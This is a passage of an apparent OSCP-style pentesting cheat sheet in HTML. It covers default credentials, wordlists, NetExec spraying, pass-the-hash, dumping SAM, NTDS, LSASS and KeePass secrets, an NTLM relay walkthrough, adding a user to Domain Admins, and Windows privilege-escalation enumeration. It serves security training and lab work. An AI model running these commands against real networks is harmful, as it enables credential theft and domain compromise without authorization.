                <li><a href="https://hashes.com/en/tools/hash_identifier">Hashes</a></li>
                <li><a href="https://hashes.com/en/decrypt/hash">HashIdentifier</a></li>
              </ul>
              <h3 id="618-default-credentials">6.18 Default Credentials</h3>
              <h4 id="6181-database-tool">6.18.1 Database Tool</h4>
              <p>This is one of the most useful tools I found for this purpose, keep im mind that you should always also
                check in the internet for other possible credentials.</p>
              <ul>
                <li>
                  <p><strong>Tool</strong>: <a
                      href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a>
                  </p>
                </li>
                <li>
                  <p><strong>Installation</strong></p>
                </li>
              </ul>
              <pre><code class="language-bash">sudo pip3 install defaultcreds-cheat-sheet</code></pre>
              <ul>
                <li><strong>Usage</strong></li>
              </ul>
              <pre><code class="language-bash">creds search [service/web_server/term]

# Example:
creds search tomcat
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat (web)              |   tomcat   |   tomcat   |
| apache tomcat (web)              |   admin    |   admin    |
+----------------------------------+------------+------------+</code></pre>
              <ul>
                <li><strong>Export Credentials to Files</strong> (could be used for brute force attacks)</li>
              </ul>
              <pre><code class="language-bash">creds search [service/web_server/term] export</code></pre>
              <ul>
                <li><strong>Update Records</strong></li>
              </ul>
              <pre><code class="language-bash">creds update</code></pre>
              <ul>
                <li><strong>Run Credentials Through Proxy</strong></li>
              </ul>
              <pre><code class="language-bash"># Search for product creds
creds search [service/web_server/term] --proxy=http://localhost:8080

# update records
creds update --proxy=http://localhost:8080

# Example: Search for Tomcat creds and export results to /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
creds search tomcat --proxy=http://localhost:8080 export</code></pre>
              <h4 id="6182-most-common-credentials">6.18.2 Most Common Credentials</h4>
              <pre><code class="language-plaintext"># Commonly guessed or default credentials
root:root                # Default root credentials
admin@example.com:admin  # Common admin credentials for email accounts
admin:admin              # Standard admin/admin credentials
USERK:USERK              # Credentials matching the box name (e.g., a target machine&#39;s name)
cassie:cassie            # Credentials found using exiftool or similar methods

# Additional Default Credentials
admin:password           # Standard admin/password credentials
admin:1234               # Admin credentials with simple numeric password
administrator:admin      # Default admin credentials for Windows systems
admin:admin123           # Common admin credentials with variations
guest:guest              # Default guest credentials for various systems
user:user                # Basic user credentials
test:test                # Test account credentials
support:support          # Default support account credentials
manager:manager          # Common manager credentials
operator:operator        # Default operator credentials
service:service          # Default service account credentials
postgres:postgres        # Default PostgreSQL credentials
mysql:mysql              # Default MySQL credentials</code></pre>
              <h4 id="6183-strategies-for-effective-password-guessing">6.18.3 Strategies for Effective Password Guessing
              </h4>
              <ol>
                <li><strong>Common Combinations</strong>: Start with widely used username/password combinations.</li>
                <li><strong>Box-Specific Credentials</strong>: Test credentials that might be related to the target
                  machine or service (e.g., <code>USERK:USERK</code>).</li>
                <li><strong>Metadata Extraction</strong>: Use tools like <code>exiftool</code> to find usernames and
                  passwords embedded in metadata.</li>
                <li><strong>Brute Force and Dictionary Attacks</strong>: For more comprehensive password guessing, use
                  tools that can automate these attacks with a wordlist.</li>
              </ol>
              <h4 id="6184-tips">6.18.4 Tips</h4>
              <ul>
                <li><strong>Default Password Lists</strong>: Utilize common default password lists, such as those
                  provided by security tools or databases like <a
                    href="https://github.com/danielmiessler/SecLists">SecLists</a>.</li>
                <li><strong>Vendor Documentation</strong>: Check vendor documentation or forums for default credentials
                  specific to certain devices or software.</li>
                <li><strong>Device Manuals</strong>: Refer to device manuals or configuration guides for default
                  credentials used in network devices or applications.</li>
              </ul>
              <h3 id="619-recommended-wordlists">6.19 Recommended Wordlists</h3>
              <ul>
                <li>Cracking hashes and passwords: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/wordlists/rockyou.txt</code></a>.
                </li>
                <li>DNS Enumeration: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt</code></a>.
                </li>
                <li>SNMP Community Strings Brute-Forcing: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt</code></a>.
                </li>
                <li>Users Enumeration (ideal to find possible users for attacks like ASPRoasting, Kerbrute,
                  Kerberoasting,
                  and others): <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></a>
                </li>
                <li>Web Directory Enumeration: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></a>,
                  <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/dirb/wordlists/common.txt</code></a>
                  and <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/dirb/wordlists/big.txt</code></a>.
                </li>
                <li>Web File Enumeration: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt</code></a>.
                </li>
              </ul>
              <h3 id="620-netexec-ncx">6.20 NetExec (NCX)</h3>
              <p>NetExec (NCX) is a modern replacement for CrackMapExec, offering a variety of new modules for enhanced
                functionality.
                Explore the <a href="https://github.com/Pennyw0rth/NetExec?tab=readme-ov-file">GitHub repository</a> for
                the source
                code and updates. <strong>More detailed usage and module information are available in the <a
                    href="https://www.netexec.wiki/">WiKi documentation</a></strong>.</p>
              <h4 id="6201-enumeration">6.20.1 Enumeration</h4>
              <ul>
                <li>Initial Enumeration</li>
              </ul>
              <pre><code class="language-bash">netexec smb target
</code></pre>
              <ul>
                <li>Null Authentication</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u &#39;&#39; -p &#39;&#39;
</code></pre>
              <ul>
                <li>Guest Authentication</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u &#39;guest&#39; -p &#39;&#39;
</code></pre>
              <ul>
                <li>List Shares</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u &#39;&#39; -p &#39;&#39; --shares

netexec smb target -u [username] -p [password] --shares

netexec smb target --shares --policies
</code></pre>
              <ul>
                <li>List Groups</li>
              </ul>
              <pre><code class="language-bash">netexec smb target --groups
</code></pre>
              <ul>
                <li>List Usernames</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u &#39;&#39; -p &#39;&#39; --users

netexec smb target -u [username] -p [password] --users

netexec smb target -u &#39;&#39; -p &#39;&#39; --rid-brute

netexec smb target -u &#39;&#39; -p &#39;&#39; --rid-brute --rid-range 500-1100
</code></pre>
              <h4 id="6202-spraying">6.20.2 Spraying</h4>
              <ul>
                <li><strong>Available Protocols</strong></li>
              </ul>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Protocol</strong></th>
                    <th><strong>See Pwn3d! in output</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>FTP</td>
                    <td>No check</td>
                  </tr>
                  <tr>
                    <td>SSH</td>
                    <td>Root (otherwise specific message) ‚úÖ</td>
                  </tr>
                  <tr>
                    <td>WinRM</td>
                    <td>Code execution at least üëæ</td>
                  </tr>
                  <tr>
                    <td>LDAP</td>
                    <td>Path to domain admin üëë</td>
                  </tr>
                  <tr>
                    <td>SMB</td>
                    <td>Most likely local admin ‚úÖ</td>
                  </tr>
                  <tr>
                    <td>RDP</td>
                    <td>Code execution at least üëæ</td>
                  </tr>
                  <tr>
                    <td>VNC</td>
                    <td>Code execution at least üëæ</td>
                  </tr>
                  <tr>
                    <td>WMI</td>
                    <td>Most likely local admin ‚úÖ</td>
                  </tr>
                  <tr>
                    <td>MSSQL</td>
                    <td>------</td>
                  </tr>
                  <tr>
                    <td>NFS</td>
                    <td>------</td>
                  </tr>
                </tbody>
              </table>
              <ul>
                <li><strong>Password Formating</strong> for Special Characters:</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p &#39;[P@$$w0rd!]&#39;
netexec smb target -u [username] -p &#39;password with spaces&#39;
</code></pre>
              <ul>
                <li><strong>Password Spraying</strong>: when using usernames or passwords that contain special symbols
                  (especially
                  exclaimation points!), wrap them in single quotes to make your shell interpret them as a string.</li>
              </ul>
              <pre><code class="language-bash"># Using Passwords
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt

netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth

netexec [protocol] [target(s)] -u username1 -p password1 password2

netexec [protocol] [target(s)] -u username1 username2 -p password1

# Using NTLM Hashes
netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt

netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth

# SMB Specific
netexec smb target -u [usernames].txt -p [password] --continue-on-success

netexec smb target -u [usernames].txt -p [password]s.txt --no-bruteforce --continue-on-success

# SSH
netexec ssh target -u [username] -p [password] --continue-on-success
</code></pre>
              <ul>
                <li>Password <strong>Spraying Without Bruteforce</strong>: can be usefull for protocols like WinRM and
                  MSSQL; this
                  option avoid the bruteforce when you use files (-u file -p file).</li>
              </ul>
              <pre><code class="language-bash">netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce

netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce
</code></pre>
              <pre><code class="language-txt">user1 -&gt; pass1
user2 -&gt; pass2
</code></pre>
              <ul>
                <li><strong>Local Authentication</strong></li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p &#39;[password]&#39; --local-auth
netexec smb [target] -u [username] -H &#39;[LM:NT]&#39; --local-auth
netexec smb [target] -u [username] -H &#39;[NTHASH]&#39; --local-auth

# Examples
netexec smb [target] -u &#39;&#39; -p &#39;&#39; --local-auth
netexec smb [target] -u localguy -H &#39;13b29964cc2480b4ef454c59562e675c&#39; --local-auth
netexec smb [target] -u localguy -H &#39;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#39; --local-auth
</code></pre>
              <ul>
                <li>Using <strong>Kerberos</strong>: use <code>-k</code> if you suspect Kerberos tickets are available
                  in the
                  environment, e.g., for domain-joined systems or when running with domain credentials.</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p [password] -k
</code></pre>
              <h4 id="6203-smb">6.20.3 SMB</h4>
              <ul>
                <li>All In One</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
</code></pre>
              <ul>
                <li>Spider_plus Module</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p [password] -M spider_plus

netexec smb target -u [username] -p [password] -M spider_plus -o READ_ONLY=false
</code></pre>
              <ul>
                <li>Dump a specific file</li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p [password] -k --get-file target_file output_file --share sharename
</code></pre>
              <h4 id="6204-ftp">6.20.4 FTP</h4>
              <ul>
                <li>List folders and files</li>
              </ul>
              <pre><code class="language-bash">netexec ftp target -u [username] -p [password] --ls
</code></pre>
              <ul>
                <li>List files inside a folder</li>
              </ul>
              <pre><code class="language-bash">netexec ftp target -u [username] -p [password] --ls folder_name
</code></pre>
              <ul>
                <li>Retrieve a specific file</li>
              </ul>
              <pre><code class="language-bash">netexec ftp target -u [username] -p [password] --ls folder_name --get file_name
</code></pre>
              <h4 id="6205-ldap">6.20.5 LDAP</h4>
              <ul>
                <li>Enumerate users using ldap</li>
              </ul>
              <pre><code class="language-bash">netexec ldap target -u &#39;&#39; -p &#39;&#39; --users
</code></pre>
              <ul>
                <li>All In One</li>
              </ul>
              <pre><code class="language-bash">netexec ldap target -u [username] -p [password] --trusted-for-delegation  --[password]-not-required --admin-count --users --groups
</code></pre>
              <ul>
                <li>Kerberoast</li>
              </ul>
              <pre><code class="language-bash">netexec ldap target -u [username] -p [password] --kerberoasting kerb.txt
</code></pre>
              <ul>
                <li>ASREProast</li>
              </ul>
              <pre><code class="language-bash">netexec ldap target -u [username] -p [password] --asreproast asrep.txt
</code></pre>
              <h4 id="6206-mssql">6.20.6 MSSQL</h4>
              <ul>
                <li>Authentication</li>
              </ul>
              <pre><code class="language-bash">netexec mssql target -u [username] -p [password]
</code></pre>
              <ul>
                <li>Execute commands using <code>xp_cmdshell</code>: <code>-X</code> for powershell and <code>-x</code>
                  for cmd</li>
              </ul>
              <pre><code class="language-bash">netexec mssql target -u [username] -p [password] -x [command_to_execute]
</code></pre>
              <ul>
                <li>Get a file</li>
              </ul>
              <pre><code class="language-bash">netexec mssql target -u [username] -p [password] --get-file output_file target_file
</code></pre>
              <h4 id="6207-secrets-dump">6.20.7 Secrets Dump</h4>
              <ul>
                <li>Dump <strong>SAM</strong></li>
              </ul>
              <pre><code class="language-bash">nxc smb target -u [username] -p [password] --sam
</code></pre>
              <ul>
                <li>Dump <strong>LSA Secrets</strong></li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p [password] --local-auth --lsa

# If you found an account starting with _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} you can get the account behind, by using gMSA below.
</code></pre>
              <ul>
                <li>Dump <strong>NTDS.dit</strong></li>
              </ul>
              <pre><code class="language-bash">netexec smb target -u [username] -p [password] --ntds
</code></pre>
              <ul>
                <li>Dump <strong>LSASS</strong></li>
              </ul>
              <pre><code class="language-bash"># Using Lsassy
nxc smb target -u [username] -p [password] -M lsassy

# Using nanodump
nxc smb target -u [username] -p [password] -M nanodump

# Using Mimikatz (deprectaed): you need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND=&#39;&quot;lsadump::dcsync /domain:domain.local /user:krbtgt&quot;
</code></pre>
              <ul>
                <li><strong>gMSA</strong></li>
              </ul>
              <pre><code class="language-bash">netexec ldap target -u [username] -p [password] --gmsa-convert-id id

netexec ldap domain -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account
</code></pre>
              <ul>
                <li><strong>Group Policy Preferences (GPP)</strong></li>
              </ul>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] -M gpp_[password]
</code></pre>
              <ul>
                <li>Dump LAPS v1 and v2 password</li>
              </ul>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] --laps
</code></pre>
              <ul>
                <li>Dump <code>dpapi</code> credentials</li>
              </ul>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] --laps --dpapi
</code></pre>
              <ul>
                <li>Dump <strong>WiFi credentials</strong></li>
              </ul>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] -M wifi
</code></pre>
              <ul>
                <li>Dump <strong>KeePass</strong></li>
              </ul>
              <pre><code class="language-bash"># You can check if keepass is installed on the target computer and then steal the master password and decrypt the database
nxc smb [target] -u [username] -p [password] -M keepass_discover

nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH=&quot;path_from_module_discovery&quot;
</code></pre>
              <h4 id="6208-bloodhound">6.20.8 Bloodhound</h4>
              <ol>
                <li>Perform these changes in the configuration file <code>~/.nxc/nxc.conf</code>:</li>
              </ol>
              <pre><code class="language-txt">[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
</code></pre>
              <ol start="2">
                <li>Once the above is setup you can get your information</li>
              </ol>
              <pre><code class="language-bash">netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All
</code></pre>
              <h4 id="6209-useful-modules">6.20.9 Useful Modules</h4>
              <h5 id="62091-webdav">6.20.9.1 Webdav</h5>
              <p>Checks whether the WebClient service is running on the target</p>
              <pre><code class="language-bash">netexec smb ip -u [username] -p [password] -M webdav 
</code></pre>
              <h5 id="62092-veeam">6.20.9.2 Veeam</h5>
              <p>Extracts credentials from local Veeam SQL Database</p>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] -M veeam
</code></pre>
              <h5 id="62093-slinky">6.20.9.3 slinky</h5>
              <p>Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in
                all shares
                with write permissions</p>
              <pre><code class="language-bash">netexec smb ip -u [username] -p [password] -M slinky 
</code></pre>
              <h5 id="62094-ntdsutil">6.20.9.4 ntdsutil</h5>
              <p>Dump NTDS with ntdsutil</p>
              <pre><code class="language-bash">netexec smb ip -u [username] -p [password] -M ntdsutil 
</code></pre>
              <h5 id="62095-ldap-checker">6.20.9.5 ldap-checker</h5>
              <p>Checks whether LDAP signing and binding are required and/or enforced</p>
              <pre><code class="language-bash">netexec ldap [target] -u [username] -p [password] -M ldap-checker
</code></pre>
              <h5 id="62096-check-if-the-dc-is-vulnerable-to-zerologon-petitpotam-nopac">6.20.9.6 Check if the DC is
                vulnerable to
                zerologon, petitpotam, nopac</h5>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] -M zerologon

netexec smb [target] -u [username] -p [password] -M petitpotam

netexec smb [target] -u [username] -p [password] -M nopac
</code></pre>
              <h5 id="62097-check-the-machineaccountquota">6.20.9.7 Check the MachineAccountQuota</h5>
              <pre><code class="language-bash">netexec ldap [target] -u [username] -p [password] -M maq
</code></pre>
              <h5 id="62098-adcs-enumeration">6.20.9.8 ADCS Enumeration</h5>
              <pre><code class="language-bash">netexec ldap [target] -u [username] -p [password] -M adcs
</code></pre>
              <h5 id="62099-retrieve-msol-account-password">6.20.9.9 Retrieve MSOL Account Password</h5>
              <pre><code class="language-bash">netexec smb [target] -u [username] -p [password] -M msol
</code></pre>
              <h5 id="620910-ntlm-relay-attack">6.20.9.10 NTLM Relay Attack</h5>
              <p>Check for hosts that have SMB signing disabled, and if so capture the NTLM and perform an NTLM Relay
                Attack:</p>
              <ol>
                <li><strong>Identify if Host is Vulnerable</strong>:</li>
              </ol>
              <pre><code class="language-bash">netexec smb [target(s)] --gen-relay-list relay.txt

# Alternative with Nmap
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]

# Expected Results
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

cat relay_list.txt
192.168.1.111
192.168.1.117
</code></pre>
              <ol start="2">
                <li>Start <strong>Responder Server</strong></li>
              </ol>
              <pre><code class="language-bash">responder -I eth0
</code></pre>
              <ol start="3">
                <li><strong>Perform Relay Attack</strong>: by using the captured hashes in Responder (if applicable).
                </li>
              </ol>
              <pre><code class="language-bash">impacket-ntlmrelayx -tf relay.txt -smb2support
</code></pre>
              <ol start="4">
                <li><strong>Perform Actions on Objective</strong>: access shares or execute commands or do pass-the-hash
                  attacks or
                  try to crack the NTLM hash, this is now whatever you want to do.</li>
              </ol>
              <h4 id="62010-impersonate-logged-on-users">6.20.10 Impersonate logged-on Users</h4>
              <p>You need at least local admin privilege on the remote target.</p>
              <ol>
                <li><strong>Enumerate logged-on users</strong> on the target:</li>
              </ol>
              <pre><code class="language-bash">nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
</code></pre>
              <ol start="2">
                <li><strong>Execute commands</strong> on behalf of other users:</li>
              </ol>
              <pre><code class="language-bash">nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-user] CMD=[cmd-command]

# Custom command to add a user to the domain admin group: powershell.exe \&quot;Invoke-Command -ComputerName [DC_NAME] -ScriptBlock {Add-ADGroupMember -Identity &#39;Domain Admins&#39; -Members USER.NAME}\&quot;
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/netexec_01.png" class="img-fluid" alt="Impersonate Logged In Users with NetExec.">
                  <figcaption class="figure-caption text-center">Impersonate Logged In Users with NetExec.</figcaption>
                </figure>
              </div>
              <h4 id="62011-multi-domain-environment">6.20.11 Multi-Domain Environment</h4>
              <pre><code class="language-bash">netexec [protocol] [target(s)] -u FILE -p password
</code></pre>
              <p>Where <strong>FILE</strong> is a file with usernames in this format:</p>
              <pre><code class="language-txt">DOMAIN1\user
DOMAIN2\user
</code></pre>
              <p><strong>Script to create a list of <code>[domains]\[users]</code></strong>:</p>
              <pre><code class="language-bash">python3 script.py -u [users_list].txt -d [domains_list].txt
</code></pre>
              <pre><code class="language-python">import argparse

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(description=&quot;Generate combinations of domains and users.&quot;)
    parser.add_argument(&quot;-d&quot;, &quot;--domain&quot;, required=True, help=&quot;Path to the domains file&quot;)
    parser.add_argument(&quot;-u&quot;, &quot;--users&quot;, required=True, help=&quot;Path to the users file&quot;)
    parser.add_argument(&quot;-o&quot;, &quot;--output&quot;, default=&quot;output.txt&quot;, help=&quot;Output file name (default: output.txt)&quot;)
    args = parser.parse_args()

    # Read the domains and users from the provided files
    try:
        with open(args.domain, &quot;r&quot;) as domains_file:
            domains = [line.strip() for line in domains_file.readlines()]

        with open(args.users, &quot;r&quot;) as users_file:
            users = [line.strip() for line in users_file.readlines()]
    except FileNotFoundError as e:
        print(f&quot;Error: {e}&quot;)
        return

    # Generate combinations
    combinations = [f&quot;{domain}\\{user}&quot; for user in users for domain in domains]

    # Write the combinations to the output file
    with open(args.output, &quot;w&quot;) as output_file:
        output_file.write(&quot;\n&quot;.join(combinations))

    print(f&quot;Combinations generated and saved to {args.output}!&quot;)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>

              <h2 id="7-windows-privilege-escalation">7. <span class="emoji">ü™ü</span> Windows Privilege Escalation</h2>
              <h3 id="71-enumeration">7.1 Enumeration</h3>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Category</strong></th>
                    <th><strong>Command</strong></th>
                    <th><strong>Description</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Username and Hostname</strong></td>
                    <td><code>whoami</code></td>
                    <td>Displays the current user and hostname.</td>
                  </tr>
                  <tr>
                    <td><strong>Existing Users</strong></td>
                    <td><code>Get-LocalUser</code></td>
                    <td>Lists all local users.</td>
                  </tr>
                  <tr>
                    <td><strong>Existing Groups</strong></td>
                    <td><code>Get-LocalGroup</code></td>
                    <td>Lists all local groups.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><code>net localgroup</code></td>
                    <td>Alternative method to list groups.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><code>Get-LocalGroupMember -GroupName [GroupName]</code></td>
                    <td>Lists members of a specific group.</td>
                  </tr>
                  <tr>
                    <td><strong>Operating System, Version, and Architecture</strong></td>
                    <td><code>systeminfo</code></td>
                    <td>Displays detailed OS information.</td>
                  </tr>
                  <tr>
                    <td><strong>Network Information</strong></td>
                    <td><code>ipconfig /all</code></td>
                    <td>Displays detailed network configuration.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><code>route print</code></td>
                    <td>Shows routing table.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><code>netstat -ano</code></td>
                    <td>Displays network connections and listening ports.</td>
                  </tr>
                  <tr>
                    <td><strong>Installed Applications</strong></td>
                    <td><strong>32-bit Applications:</strong>
                      <code>Get-ItemProperty -Path &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</code>
                    </td>
                    <td>Lists installed 32-bit applications.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><em>Optional:</em> <code>Select-Object -Property DisplayName</code></td>
                    <td>Filters to show only application names.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><strong>64-bit Applications:</strong>
                      <code>Get-ItemProperty -Path &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</code>
                    </td>
                    <td>Lists installed 64-bit applications.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><em>Optional:</em> <code>Select-Object -Property DisplayName</code></td>
                    <td>Filters to show only application names.</td>
                  </tr>
                  <tr>
                    <td><strong>Running Processes</strong></td>
                    <td><code>Get-Process</code></td>
                    <td>Lists all running processes.</td>
                  </tr>
                  <tr>
                    <td></td>
                    <td><em>Optional:</em> <code>Select-Object -Property ProcessName, Path</code></td>
                    <td>Displays process names and paths.</td>
                  </tr>
                  <tr>
                    <td><strong>Service Accounts</strong></td>
                    <td><code>Get-WmiObject -Class Win32_Service | Select-Object Name, StartName</code></td>
                    <td>Lists services and their associated accounts.</td>
                  </tr>
                  <tr>
                    <td><strong>Scheduled Tasks</strong></td>
                    <td><code>Get-ScheduledTask | Select-Object TaskName, TaskPath, State</code></td>
                    <td>Displays scheduled tasks and their status.</td>
                  </tr>
                  <tr>
                    <td><strong>Local Administrator Group Members</strong></td>
                    <td><code>Get-LocalGroupMember -GroupName &quot;Administrators&quot;</code></td>
                    <td>Lists members of the local Administrators group.</td>
                  </tr>
                  <tr>
                    <td><strong>System Drives and Mounted Volumes</strong></td>
                    <td><code>Get-PSDrive -PSProvider FileSystem</code></td>
                    <td>Shows all drives and mounted volumes, including network shares.</td>
                  </tr>
                  <tr>
                    <td><strong>PowerShell Version</strong></td>
                    <td><code>$PSVersionTable.PSVersion</code></td>
                    <td>Displays the version of PowerShell in use, which can be relevant for identifying potential
                      exploitability or compatibility issues.</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="72-finding-files-in-directories">7.2 Finding Files in Directories</h3>
              <p><strong>Enumerating Everything the Users Folder Has</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
              <p><strong>Searching for Password Manager Databases</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
              <p><strong>Searching for Sensitive Information in the XAMPP Directory</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
              <p><strong>Finding Unusual Files and Directories</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
              <p><strong>Finding files with SYSTEM or Administrators group permissions</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path [Path] -File -Recurse | Where-Object { 
    (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like &quot;*SYSTEM*&quot; -or $_.IdentityReference -like &quot;*Administrators*&quot; }
}
</code></pre>
              <p><strong>Finding Large Files</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length
</code></pre>
              <p><strong>Finding Executable Files</strong></p>
              <pre><code class="language-bash">Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
              <p><strong>Finding Directories Writable by All Users</strong></p>
              <pre><code class="language-powershell">Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
    (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like &quot;*Write*&quot; -and $_.IdentityReference -like &quot;*Users*&quot; }
}
</code></pre>
              <p><strong>Using <code>Runas</code> to Execute CMD as a Different User</strong></p>
              <pre><code class="language-powershell"># Replace [Domain\Username] with the target username (e.g., backupadmin). You will be prompted to enter the password for the specified user.
runas /user:[Domain\Username] cmd
</code></pre>
              <h3 id="73-powershell-goldmine-logs">7.3 PowerShell Goldmine (Logs)</h3>
              <p><strong>Command History</strong></p>
              <pre><code class="language-powershell">Get-History
</code></pre>
              <p><strong>Finding PSReadline History File Path</strong></p>
              <pre><code class="language-powershell">(Get-PSReadlineOption).HistorySavePath
</code></pre>
              <p><strong>Finding and Viewing the Goldmine for All User (Script)</strong></p>
              <pre><code class="language-powershell">$userProfiles = Get-ChildItem -Path C:\Users -Directory

foreach ($profile in $userProfiles) {
    $historyPath = Join-Path -Path $profile.FullName -ChildPath &quot;AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;
    
    if (Test-Path $historyPath) {
        Write-Output &quot;User: $($profile.Name)&quot;
        Write-Output &quot;PSReadline History Path: $historyPath&quot;
        Write-Output &quot;--------------------------------&quot;
        Get-Content -Path $historyPath
        Write-Output &quot;&quot;
    }
}
</code></pre>
              <h3 id="74-abusing-privileges">7.4 Abusing Privileges</h3>
              <h4 id="741-check-assigned-privileges">7.4.1 Check Assigned Privileges</h4>
              <p>Keep in mind that tokens that appears as Disabled can be enabled, and we can also abuse both
                <em>Enabled</em> and <em>Disabled</em> tokens.
              </p>
              <pre><code class="language-powershell">whoami /priv
</code></pre>
              <h4 id="742-enable-all-tokens">7.4.2 Enable All Tokens</h4>
              <p>If you have tokens disables, you can use the script <a
                  href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1"><strong>EnableAllTokenPrivs.ps1</strong></a>
                below to enable all the tokens; we could also use as an alternative the script in this <a
                  href="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/">post</a>.</p>
              <pre><code class="language-powershell">.\EnableAllTokenPrivs.ps1
whoami /priv
</code></pre>
